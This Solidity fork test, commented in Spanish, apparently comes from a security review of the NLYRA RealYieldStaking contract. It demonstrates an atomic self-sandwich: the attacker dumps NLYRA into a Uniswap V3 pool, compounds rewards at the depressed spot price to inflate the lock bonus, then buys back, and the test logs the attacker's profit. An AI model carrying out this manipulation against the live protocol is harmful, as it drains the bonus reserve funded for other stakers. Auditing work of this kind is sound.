// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "oz/token/ERC20/IERC20.sol";
import {RealYieldStaking} from "../../src/RealYieldStaking.sol";
import {IUniswapV3PoolLike} from "../../src/interfaces/External.sol";
import {ForkBase} from "../ForkBase.sol";
import {NlyraFeeSplitter} from "../../src/NlyraFeeSplitter.sol";

/// R2 (economico): el bonus de compound a lock se calcula sobre el NLYRA comprado a precio SPOT.
/// Auto-sandwich atomico: vender NLYRA -> compound(0, TIER_30) -> recomprar. Lo que el compound compra
/// de mas lo paga el propio atacante (suma cero), pero el 5% de bonus sobre ese "de mas" sale de la reserva.
/// (Informativo: con el bonus al 5% hace falta todavia mas NLYRA para que convenga.)
contract R2_EconBonusSpotInflation is ForkBase {
    uint160 constant MAXP = 1461446703485210103287273052203988822378723970341;

    function _sellNlyra(uint256 nIn) internal returns (uint256 wethOut) {
        (int256 a0,) = IUniswapV3PoolLike(POOL_NLYRA).swap(address(this), false, int256(nIn), MAXP, "");
        wethOut = uint256(-a0);
    }

    function _buyNlyra(uint256 wIn) internal returns (uint256 nOut) {
        (, int256 a1) = IUniswapV3PoolLike(POOL_NLYRA).swap(address(this), true, int256(wIn), 4295128740, "");
        nOut = uint256(-a1);
    }

    function _setup(uint256 wethRewards) internal returns (uint256 ew, uint256 en) {
        _stake(alice, 100_000_000e18, 0); // atacante: ~27% del stake
        _stake(bob, 268_000_000e18, 0); // resto (~368M en total)
        _fund(owner, 40_000_000e18); // reserva de bonus: 40M NLYRA (~US$10k a 0.00025)
        deal(address(WETH), address(sp), wethRewards * 2); // 50% al staking
        sp.harvest();
        vm.warp(vm.getBlockTimestamp() + 7 days);
        (ew, en) = st.earned(alice);
    }

    function _scan(uint256 wethRewards) internal {
        (uint256 ew, uint256 en) = _setup(wethRewards);
        emit log_named_decimal_uint("alice earned WETH", ew, 18);
        emit log_named_decimal_uint("alice earned NLYRA", en, 18);
        (uint160 sp0,,,,,,) = _slot0();
        emit log_named_uint("pool NLYRA bal", NLYRA.balanceOf(POOL_NLYRA) / 1e18);
        emit log_named_decimal_uint("pool WETH bal", WETH.balanceOf(POOL_NLYRA), 18);
        sp0;

        uint256 snap = vm.snapshotState();
        vm.prank(alice);
        uint256 fairAdded = st.compound(0, 3, type(uint256).max);
        uint256 fairBonus = fairAdded - (fairAdded * 10_000) / 10_500;
        emit log_named_decimal_uint("FAIR added (NLYRA)", fairAdded, 18);
        emit log_named_decimal_uint("FAIR bonus (NLYRA)", fairBonus, 18);
        vm.revertToState(snap);

        uint256[6] memory xs =
            [uint256(500_000_000e18), 700_000_000e18, 1_000_000_000e18, 2_000_000_000e18, 4_000_000_000e18, 8_000_000_000e18];
        for (uint256 i; i < xs.length; ++i) {
            snap = vm.snapshotState();
            _giveNlyra(address(this), xs[i]);
            uint256 wOut = _sellNlyra(xs[i]);
            uint256 r0 = st.bonusReserve();
            vm.prank(alice);
            uint256 added = st.compound(0, 3, type(uint256).max);
            uint256 bonus = r0 - st.bonusReserve();
            uint256 back = _buyNlyra(wOut);
            int256 pnl = int256(added) - int256(fairAdded) + int256(back) - int256(xs[i]);
            emit log_named_uint("--- dump X (M NLYRA)", xs[i] / 1e24);
            emit log_named_decimal_uint("  bonus got (NLYRA)", bonus, 18);
            emit log_named_decimal_int("  attacker PnL vs fair compound (NLYRA)", pnl, 18);
            vm.revertToState(snap);
        }
    }

    function _slot0() internal view returns (uint160, int24, uint16, uint16, uint16, uint8, bool) {
        (bool ok, bytes memory d) = POOL_NLYRA.staticcall(abi.encodeWithSignature("slot0()"));
        require(ok);
        return abi.decode(d, (uint160, int24, uint16, uint16, uint16, uint8, bool));
    }

    /// premios semanales realistas: ~US$250 en WETH para todo el staking -> alice ~27%
    function test_scan_weekly() public {
        _scan(0.1 ether);
    }

    /// alice acumula ~10 semanas antes de componer
    function test_scan_10weeks() public {
        _scan(1 ether);
    }
}
